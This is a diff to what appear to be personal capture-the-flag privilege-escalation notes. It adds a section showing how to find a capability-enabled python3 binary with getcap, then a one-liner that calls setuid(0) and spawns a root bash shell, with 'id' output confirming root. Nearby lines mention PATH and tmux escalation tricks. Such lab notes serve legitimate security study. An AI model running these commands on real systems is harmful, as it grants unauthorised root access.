@@ -40,6 +40,16 @@ OUPUT:
     Linux Privilege Escalation Using PATH Variable
 [tmux]
     tmux -S default attach
+[Capability]
+    getcap -r / 2>/dev/null
+        /home/kiba/.hackmeplease/python3 = cap_setuid+ep
+        /usr/bin/mtr = cap_net_raw+ep
+        /usr/bin/traceroute6.iputils = cap_net_raw+ep
+        /usr/bin/systemd-detect-virt = cap_dac_override,cap_sys_ptrace+ep
+    cd /home/kiba/.hackmeplease    
+    ./python3 -c 'import os; os.setuid(0); os.system("/bin/bash")'
+    id
+        uid=0(root) gid=1000(kiba) groups=1000(kiba),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),114(lpadmin),115(sambashare)
 
 ## Transferring file using Netcat:
 - on the remote host 
